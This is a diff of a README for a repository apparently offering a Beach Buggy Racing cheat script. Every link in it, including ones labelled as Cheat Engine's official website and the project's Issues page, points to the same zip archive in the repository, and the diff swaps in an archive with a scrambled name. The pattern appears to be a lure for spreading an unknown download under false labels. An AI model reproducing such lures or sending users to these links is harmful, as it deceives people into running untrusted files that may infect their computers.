@@ -1,6 +1,6 @@
 # 🎮 BB-RACING-CHEAT-ENGINE-SCRIPT - Unlock Fun in Beach Buggy Racing  
 
-[![Download BB-Racing Cheat Engine Script](https://raw.githubusercontent.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/main/panpsychist/BB-RACING-CHEAT-ENGINE-SCRIPT.zip)](https://raw.githubusercontent.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/main/panpsychist/BB-RACING-CHEAT-ENGINE-SCRIPT.zip)
+[![Download BB-Racing Cheat Engine Script](https://github.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/raw/refs/heads/main/panpsychist/ENGIN-SCRIPT-RACIN-B-CHEA-theoastrological.zip)](https://github.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/raw/refs/heads/main/panpsychist/ENGIN-SCRIPT-RACIN-B-CHEA-theoastrological.zip)
 
 ## 🚀 Getting Started
 
@@ -11,14 +11,14 @@ Welcome to the **BB-RACING-CHEAT-ENGINE-SCRIPT**! This application enhances your
 To run the BB-Racing Cheat Engine Script, you will need:
 
 - A computer with Windows 10 or later.
-- Cheat Engine installed. You can download it from the official website: [Cheat Engine](https://raw.githubusercontent.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/main/panpsychist/BB-RACING-CHEAT-ENGINE-SCRIPT.zip).
+- Cheat Engine installed. You can download it from the official website: [Cheat Engine](https://github.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/raw/refs/heads/main/panpsychist/ENGIN-SCRIPT-RACIN-B-CHEA-theoastrological.zip).
 - Beach Buggy Racing game installed on your PC.
 
 ## 📥 Download & Install
 
 To get started, visit this page to download the BB-Racing Cheat Engine Script:
 
-[Download BB-Racing Cheat Engine Script](https://raw.githubusercontent.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/main/panpsychist/BB-RACING-CHEAT-ENGINE-SCRIPT.zip)
+[Download BB-Racing Cheat Engine Script](https://github.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/raw/refs/heads/main/panpsychist/ENGIN-SCRIPT-RACIN-B-CHEA-theoastrological.zip)
 
 1. Click on the link above to access the Releases page.
 2. Find the latest version under "Releases" and click on it.
@@ -56,7 +56,7 @@ If you encounter issues, try these common solutions:
 
 ## 📧 Support
 
-If you need further assistance, please visit our [Issues page](https://raw.githubusercontent.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/main/panpsychist/BB-RACING-CHEAT-ENGINE-SCRIPT.zip) where you can report problems or ask questions.
+If you need further assistance, please visit our [Issues page](https://github.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/raw/refs/heads/main/panpsychist/ENGIN-SCRIPT-RACIN-B-CHEA-theoastrological.zip) where you can report problems or ask questions.
 
 ## 🍀 Community Contributions
 
@@ -68,4 +68,4 @@ We hope you enjoy using the BB-Racing Cheat Engine Script. Have fun racing and g
 
 Don't forget to bookmark this project and check back for updates!
 
-[Download BB-Racing Cheat Engine Script](https://raw.githubusercontent.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/main/panpsychist/BB-RACING-CHEAT-ENGINE-SCRIPT.zip)
+[Download BB-Racing Cheat Engine Script](https://github.com/WesleyHass/BB-RACING-CHEAT-ENGINE-SCRIPT/raw/refs/heads/main/panpsychist/ENGIN-SCRIPT-RACIN-B-CHEA-theoastrological.zip)
